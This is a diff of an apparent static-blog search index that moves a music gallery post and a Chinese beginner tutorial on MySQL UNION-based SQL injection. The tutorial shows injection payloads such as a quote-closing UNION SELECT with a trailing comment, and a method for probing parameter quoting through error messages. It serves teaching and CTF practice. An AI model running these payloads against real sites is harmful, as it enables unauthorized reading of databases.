@@ -174,31 +174,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>miss oid kanye</title>
-    <url>/2024/02/26/kanye/</url>
-    <content><![CDATA[<div class="gallery-group-main">
-<figure class="gallery-group">
-  <img class="gallery-group-img no-lightbox" src='/img/kye.webp' alt="Group Image Gallery">
-  <figcaption>
-  <div class="gallery-group-name">kanye</div>
-  <p>hipop god</p>
-  <a href='/ye'></a>
-  </figcaption>
-  </figure>
-  
-</div>
-
-
-]]></content>
-      <categories>
-        <category>music</category>
-        <category>kanye</category>
-      </categories>
-      <tags>
-        <tag>music</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>js原型链污染</title>
     <url>/2024/06/12/javascript/</url>
     <content><![CDATA[<blockquote>
@@ -406,6 +381,31 @@ app<span class="token punctuation">.</span><span class="token function">all</spa
       </tags>
   </entry>
   <entry>
+    <title>miss oid kanye</title>
+    <url>/2024/02/26/kanye/</url>
+    <content><![CDATA[<div class="gallery-group-main">
+<figure class="gallery-group">
+  <img class="gallery-group-img no-lightbox" src='/img/kye.webp' alt="Group Image Gallery">
+  <figcaption>
+  <div class="gallery-group-name">kanye</div>
+  <p>hipop god</p>
+  <a href='/ye'></a>
+  </figcaption>
+  </figure>
+  
+</div>
+
+
+]]></content>
+      <categories>
+        <category>music</category>
+        <category>kanye</category>
+      </categories>
+      <tags>
+        <tag>music</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>nodejs沙箱逃逸</title>
     <url>/2024/10/12/nodejs%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
     <content><![CDATA[<h1 id="关于沙箱与nodejs-vm-vm2"><a href="#关于沙箱与nodejs-vm-vm2" class="headerlink" title="关于沙箱与nodejs vm&#x2F;vm2"></a>关于沙箱与nodejs vm&#x2F;vm2</h1><h2 id="什么是沙箱"><a href="#什么是沙箱" class="headerlink" title="什么是沙箱"></a>什么是沙箱</h2><p>我的世界是一款现象级沙盒类游戏，玩家可以在自己的世界随意创造，用自己的想象力搭建一个<b>虚拟的</b>，完全<b>与外界隔离</b>的世界。  </p>
@@ -509,121 +509,6 @@ console.log(sandbox); //&#123; animal: &#39;cat&#39;, count: 2, name: &#39;Tom&#
       <categories>
         <category>Web</category>
         <category>复现</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sql注入：从入门到入土</title>
-    <url>/2024/10/12/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/</url>
-    <content><![CDATA[<p>（全文以MySQL为例）</p>
-<h1 id="一-联合注入"><a href="#一-联合注入" class="headerlink" title="一.联合注入"></a>一.联合注入</h1><h2 id="1-简单原理"><a href="#1-简单原理" class="headerlink" title="1. 简单原理"></a>1. 简单原理</h2><p>在sql的查询语句中，union，是一个极度危险的函数。<br>其会将后面的语句作为sql命令执行，拼接到前面正常的结果集后。<br>例子：  </p>
-<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> usr <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">;</span>
-
-<span class="token operator">+</span><span class="token comment">------+-------+</span>
-<span class="token operator">|</span> id   <span class="token operator">|</span> name  <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">------+-------+</span>
-<span class="token operator">|</span>    <span class="token number">1</span> <span class="token operator">|</span> admin <span class="token operator">|</span>
-<span class="token operator">|</span>    <span class="token number">2</span> <span class="token operator">|</span> text1 <span class="token operator">|</span>
-<span class="token operator">|</span>    <span class="token number">3</span> <span class="token operator">|</span> lisi  <span class="token operator">|</span>
-<span class="token operator">|</span>    <span class="token number">4</span> <span class="token operator">|</span> gest  <span class="token operator">|</span>
-<span class="token operator">|</span>    <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>     <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">------+-------+</span></code></pre>
-<p>1,2表头被拼接起来（这里的1，2实际上不存在）<br>那么加上恶意的查询  </p>
-<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> usr <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> home<span class="token punctuation">;</span>
-
-<span class="token operator">+</span><span class="token comment">------+---------------------+</span>
-<span class="token operator">|</span> id   <span class="token operator">|</span> name                <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">------+---------------------+</span>
-<span class="token operator">|</span>    <span class="token number">1</span> <span class="token operator">|</span> admin               <span class="token operator">|</span>
-<span class="token operator">|</span>    <span class="token number">2</span> <span class="token operator">|</span> text1               <span class="token operator">|</span>
-<span class="token operator">|</span>    <span class="token number">3</span> <span class="token operator">|</span> lisi                <span class="token operator">|</span>
-<span class="token operator">|</span>    <span class="token number">4</span> <span class="token operator">|</span> gest                <span class="token operator">|</span>
-<span class="token operator">|</span>    <span class="token number">1</span> <span class="token operator">|</span> flag&#123;ye <span class="token operator">is</span> watch u&#125; <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">------+---------------------+</span></code></pre>
-<p>很明显，命令被执行了。<br>当然这只是理想情况，在实际的开发环境中我们几乎不可能知道这个<font color="yellow">表有几行几列，这个表叫什么，查询语句的格式等等……</font>  </p>
-<blockquote>
-<p>而正因为如此，其为我们进行漏洞注入提供了思路。</p>
-</blockquote>
-<h2 id="2-联合注入的步骤"><a href="#2-联合注入的步骤" class="headerlink" title="2. 联合注入的步骤"></a>2. 联合注入的步骤</h2><blockquote>
-<ol>
-<li>判断数据类型</li>
-<li>查列数</li>
-<li>却定字段的位置</li>
-<li>查表名</li>
-<li>查列名</li>
-<li>获取数据</li>
-</ol>
-</blockquote>
-<p>先根据以下语句的变化进行一个简单的理解：  </p>
-<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span>$id
-<span class="token comment">-- 一般情况下，查询语句的where条件里对于列或表的表述的参数都是变量，一般是接受用户的get或post请求</span>
-
-<span class="token comment">-- 而对于该变量的格式又有多种：</span>
- id<span class="token operator">=</span><span class="token string">"$id"</span>
- id<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"$id"</span><span class="token punctuation">)</span>
- id<span class="token operator">=</span><span class="token string">'1'</span></code></pre>
-<p>我们拿id&#x3D;’1’来举例子</p>
-<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span><span class="token punctuation">;</span>
-<span class="token comment">-- 1是客户端post传值给ssqqll的值</span>
-<span class="token comment">-- 如果： ssqqll = 1 union select 1,2 from home;</span>
-<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1 union select 1,2 from home;'</span><span class="token punctuation">;</span>
-<span class="token comment">-- 由于php弱比较，会先将不同类型的给是转化成相同，像此处，php会将字符串逐一遍历来得到数字，得到1，所以注入失效了。</span>
-
-
-<span class="token comment">-- 但是要是我传参  ssqqll = 1' union select 1,2 from home;#（这里的#要url编码为%23，否则则会表示特殊锚点）</span>
-<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">from</span> home<span class="token punctuation">;</span><span class="token comment">#';</span>
-
-<span class="token operator">+</span><span class="token comment">------+---------------------+</span>
-<span class="token operator">|</span> id   <span class="token operator">|</span> name                <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">------+---------------------+</span>
-<span class="token operator">|</span>    <span class="token number">1</span> <span class="token operator">|</span> admin               <span class="token operator">|</span>
-<span class="token operator">|</span>    <span class="token number">2</span> <span class="token operator">|</span> text1               <span class="token operator">|</span>
-<span class="token operator">|</span>    <span class="token number">3</span> <span class="token operator">|</span> lisi                <span class="token operator">|</span>
-<span class="token operator">|</span>    <span class="token number">4</span> <span class="token operator">|</span> gest                <span class="token operator">|</span>
-<span class="token operator">|</span>    <span class="token number">1</span> <span class="token operator">|</span> flag&#123;ye <span class="token operator">is</span> watch u&#125; <span class="token operator">|</span>
-<span class="token operator">+</span><span class="token comment">------+---------------------+</span></code></pre>
-<p>最后，前方的‘1’闭合完成语句，后方把不符合语法的多余部分注释掉，完成联合注入  </p>
-<p>ok，我们回到正题，首先第一步：</p>
-<blockquote>
-<p>判断数据类型，其实就是通过测试包错来试出他的包裹结构</p>
-</blockquote>
-<p>还记得上面的例子吗，包裹一共最基本也就4种形态<br>不外乎(1), ‘1’ ,”1” ,1  。</p>
-<blockquote>
-<p>当然这些都是可以<font color="red">相互嵌套的，能整出很多花样</font></p>
-</blockquote>
-<p>一个例子，抑或是一个思路</p>
-<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 当我们传参？id=1时，有</span>
-MYSql Test
-ID	Username
-<span class="token number">1</span>	admin
-
-<span class="token comment">-- ?id=1'</span>
-无法取得数据: You have an error <span class="token operator">in</span> your <span class="token keyword">SQL</span> syntax<span class="token punctuation">;</span> <span class="token keyword">check</span> the manual that corresponds <span class="token keyword">to</span> your MySQL server version <span class="token keyword">for</span> the <span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span> near <span class="token string">''</span><span class="token number">1</span><span class="token string">''</span>' at line <span class="token number">1</span>  
-</code></pre>
-<p>好，重点来了，根据报错信息，是出现了’1’’,所以断定为’1’包裹。  </p>
-<blockquote>
-<p>当然，有的情况是报错不会给出这么详细或是干脆没有报错。并不碍事，照着刚才的思路，先根据四种基本包裹一步一步慢慢排除</p>
-</blockquote>
-<p>这里给一个模板，以后做手注盘判断时可以直接拿来用  </p>
-<blockquote>
-<ol>
-<li>select * from users where id&#x3D; 1 </li>
-<li>select * from users where id&#x3D;’1’ </li>
-<li>select * from users where id&#x3D;(‘1’)</li>
-<li>select * from users where id&#x3D;”‘1’”</li>
-<li>select * from users where id&#x3D;(1)</li>
-<li>select * from users where id&#x3D;((‘1’))</li>
-<li>select * from users where id&#x3D;(“‘1’”) </li>
-<li>select * from users where id&#x3D;”1”</li>
-</ol>
-</blockquote>
-<p>慢慢试，排除哪个就注释哪个（后面我们学到sqlmap时就不用这么麻烦了，这么做更多的是锻炼思维）</p>
-<h1 id="二"><a href="#二" class="headerlink" title="二."></a>二.</h1><h2 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h2><h2 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h2><h2 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h2><h1 id="三"><a href="#三" class="headerlink" title="三."></a>三.</h1><h2 id="1-1"><a href="#1-1" class="headerlink" title="1."></a>1.</h2><h2 id="2-1"><a href="#2-1" class="headerlink" title="2."></a>2.</h2><h2 id="3-1"><a href="#3-1" class="headerlink" title="3."></a>3.</h2><h1 id="四"><a href="#四" class="headerlink" title="四."></a>四.</h1><h2 id="1-2"><a href="#1-2" class="headerlink" title="1."></a>1.</h2><h2 id="2-2"><a href="#2-2" class="headerlink" title="2."></a>2.</h2><h2 id="3-2"><a href="#3-2" class="headerlink" title="3."></a>3.</h2><h1 id="五"><a href="#五" class="headerlink" title="五."></a>五.</h1><h2 id="1-3"><a href="#1-3" class="headerlink" title="1."></a>1.</h2><h2 id="2-3"><a href="#2-3" class="headerlink" title="2."></a>2.</h2><h2 id="3-3"><a href="#3-3" class="headerlink" title="3."></a>3.</h2>]]></content>
-      <categories>
-        <category>Web</category>
-        <category>资料</category>
       </categories>
       <tags>
         <tag>Web</tag>
@@ -855,6 +740,121 @@ gopher:// 分布式文档传递服务，可使用gopherus生成payload
       <categories>
         <category>Web</category>
         <category>复现</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入：从入门到入土</title>
+    <url>/2024/10/12/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/</url>
+    <content><![CDATA[<p>（全文以MySQL为例）</p>
+<h1 id="一-联合注入"><a href="#一-联合注入" class="headerlink" title="一.联合注入"></a>一.联合注入</h1><h2 id="1-简单原理"><a href="#1-简单原理" class="headerlink" title="1. 简单原理"></a>1. 简单原理</h2><p>在sql的查询语句中，union，是一个极度危险的函数。<br>其会将后面的语句作为sql命令执行，拼接到前面正常的结果集后。<br>例子：  </p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> usr <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">;</span>
+
+<span class="token operator">+</span><span class="token comment">------+-------+</span>
+<span class="token operator">|</span> id   <span class="token operator">|</span> name  <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">------+-------+</span>
+<span class="token operator">|</span>    <span class="token number">1</span> <span class="token operator">|</span> admin <span class="token operator">|</span>
+<span class="token operator">|</span>    <span class="token number">2</span> <span class="token operator">|</span> text1 <span class="token operator">|</span>
+<span class="token operator">|</span>    <span class="token number">3</span> <span class="token operator">|</span> lisi  <span class="token operator">|</span>
+<span class="token operator">|</span>    <span class="token number">4</span> <span class="token operator">|</span> gest  <span class="token operator">|</span>
+<span class="token operator">|</span>    <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>     <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">------+-------+</span></code></pre>
+<p>1,2表头被拼接起来（这里的1，2实际上不存在）<br>那么加上恶意的查询  </p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> usr <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> home<span class="token punctuation">;</span>
+
+<span class="token operator">+</span><span class="token comment">------+---------------------+</span>
+<span class="token operator">|</span> id   <span class="token operator">|</span> name                <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">------+---------------------+</span>
+<span class="token operator">|</span>    <span class="token number">1</span> <span class="token operator">|</span> admin               <span class="token operator">|</span>
+<span class="token operator">|</span>    <span class="token number">2</span> <span class="token operator">|</span> text1               <span class="token operator">|</span>
+<span class="token operator">|</span>    <span class="token number">3</span> <span class="token operator">|</span> lisi                <span class="token operator">|</span>
+<span class="token operator">|</span>    <span class="token number">4</span> <span class="token operator">|</span> gest                <span class="token operator">|</span>
+<span class="token operator">|</span>    <span class="token number">1</span> <span class="token operator">|</span> flag&#123;ye <span class="token operator">is</span> watch u&#125; <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">------+---------------------+</span></code></pre>
+<p>很明显，命令被执行了。<br>当然这只是理想情况，在实际的开发环境中我们几乎不可能知道这个<font color="yellow">表有几行几列，这个表叫什么，查询语句的格式等等……</font>  </p>
+<blockquote>
+<p>而正因为如此，其为我们进行漏洞注入提供了思路。</p>
+</blockquote>
+<h2 id="2-联合注入的步骤"><a href="#2-联合注入的步骤" class="headerlink" title="2. 联合注入的步骤"></a>2. 联合注入的步骤</h2><blockquote>
+<ol>
+<li>判断数据类型</li>
+<li>查列数</li>
+<li>却定字段的位置</li>
+<li>查表名</li>
+<li>查列名</li>
+<li>获取数据</li>
+</ol>
+</blockquote>
+<p>先根据以下语句的变化进行一个简单的理解：  </p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span>$id
+<span class="token comment">-- 一般情况下，查询语句的where条件里对于列或表的表述的参数都是变量，一般是接受用户的get或post请求</span>
+
+<span class="token comment">-- 而对于该变量的格式又有多种：</span>
+ id<span class="token operator">=</span><span class="token string">"$id"</span>
+ id<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">"$id"</span><span class="token punctuation">)</span>
+ id<span class="token operator">=</span><span class="token string">'1'</span></code></pre>
+<p>我们拿id&#x3D;’1’来举例子</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span><span class="token punctuation">;</span>
+<span class="token comment">-- 1是客户端post传值给ssqqll的值</span>
+<span class="token comment">-- 如果： ssqqll = 1 union select 1,2 from home;</span>
+<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1 union select 1,2 from home;'</span><span class="token punctuation">;</span>
+<span class="token comment">-- 由于php弱比较，会先将不同类型的给是转化成相同，像此处，php会将字符串逐一遍历来得到数字，得到1，所以注入失效了。</span>
+
+
+<span class="token comment">-- 但是要是我传参  ssqqll = 1' union select 1,2 from home;#（这里的#要url编码为%23，否则则会表示特殊锚点）</span>
+<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">from</span> home<span class="token punctuation">;</span><span class="token comment">#';</span>
+
+<span class="token operator">+</span><span class="token comment">------+---------------------+</span>
+<span class="token operator">|</span> id   <span class="token operator">|</span> name                <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">------+---------------------+</span>
+<span class="token operator">|</span>    <span class="token number">1</span> <span class="token operator">|</span> admin               <span class="token operator">|</span>
+<span class="token operator">|</span>    <span class="token number">2</span> <span class="token operator">|</span> text1               <span class="token operator">|</span>
+<span class="token operator">|</span>    <span class="token number">3</span> <span class="token operator">|</span> lisi                <span class="token operator">|</span>
+<span class="token operator">|</span>    <span class="token number">4</span> <span class="token operator">|</span> gest                <span class="token operator">|</span>
+<span class="token operator">|</span>    <span class="token number">1</span> <span class="token operator">|</span> flag&#123;ye <span class="token operator">is</span> watch u&#125; <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token comment">------+---------------------+</span></code></pre>
+<p>最后，前方的‘1’闭合完成语句，后方把不符合语法的多余部分注释掉，完成联合注入  </p>
+<p>ok，我们回到正题，首先第一步：</p>
+<blockquote>
+<p>判断数据类型，其实就是通过测试包错来试出他的包裹结构</p>
+</blockquote>
+<p>还记得上面的例子吗，包裹一共最基本也就4种形态<br>不外乎(1), ‘1’ ,”1” ,1  。</p>
+<blockquote>
+<p>当然这些都是可以<font color="red">相互嵌套的，能整出很多花样</font></p>
+</blockquote>
+<p>一个例子，抑或是一个思路</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 当我们传参？id=1时，有</span>
+MYSql Test
+ID	Username
+<span class="token number">1</span>	admin
+
+<span class="token comment">-- ?id=1'</span>
+无法取得数据: You have an error <span class="token operator">in</span> your <span class="token keyword">SQL</span> syntax<span class="token punctuation">;</span> <span class="token keyword">check</span> the manual that corresponds <span class="token keyword">to</span> your MySQL server version <span class="token keyword">for</span> the <span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span> near <span class="token string">''</span><span class="token number">1</span><span class="token string">''</span>' at line <span class="token number">1</span>  
+</code></pre>
+<p>好，重点来了，根据报错信息，是出现了’1’’,所以断定为’1’包裹。  </p>
+<blockquote>
+<p>当然，有的情况是报错不会给出这么详细或是干脆没有报错。并不碍事，照着刚才的思路，先根据四种基本包裹一步一步慢慢排除</p>
+</blockquote>
+<p>这里给一个模板，以后做手注盘判断时可以直接拿来用  </p>
+<blockquote>
+<ol>
+<li>select * from users where id&#x3D; 1 </li>
+<li>select * from users where id&#x3D;’1’ </li>
+<li>select * from users where id&#x3D;(‘1’)</li>
+<li>select * from users where id&#x3D;”‘1’”</li>
+<li>select * from users where id&#x3D;(1)</li>
+<li>select * from users where id&#x3D;((‘1’))</li>
+<li>select * from users where id&#x3D;(“‘1’”) </li>
+<li>select * from users where id&#x3D;”1”</li>
+</ol>
+</blockquote>
+<p>慢慢试，排除哪个就注释哪个（后面我们学到sqlmap时就不用这么麻烦了，这么做更多的是锻炼思维）</p>
+<h1 id="二"><a href="#二" class="headerlink" title="二."></a>二.</h1><h2 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h2><h2 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h2><h2 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h2><h1 id="三"><a href="#三" class="headerlink" title="三."></a>三.</h1><h2 id="1-1"><a href="#1-1" class="headerlink" title="1."></a>1.</h2><h2 id="2-1"><a href="#2-1" class="headerlink" title="2."></a>2.</h2><h2 id="3-1"><a href="#3-1" class="headerlink" title="3."></a>3.</h2><h1 id="四"><a href="#四" class="headerlink" title="四."></a>四.</h1><h2 id="1-2"><a href="#1-2" class="headerlink" title="1."></a>1.</h2><h2 id="2-2"><a href="#2-2" class="headerlink" title="2."></a>2.</h2><h2 id="3-2"><a href="#3-2" class="headerlink" title="3."></a>3.</h2><h1 id="五"><a href="#五" class="headerlink" title="五."></a>五.</h1><h2 id="1-3"><a href="#1-3" class="headerlink" title="1."></a>1.</h2><h2 id="2-3"><a href="#2-3" class="headerlink" title="2."></a>2.</h2><h2 id="3-3"><a href="#3-3" class="headerlink" title="3."></a>3.</h2>]]></content>
+      <categories>
+        <category>Web</category>
+        <category>资料</category>
       </categories>
       <tags>
         <tag>Web</tag>
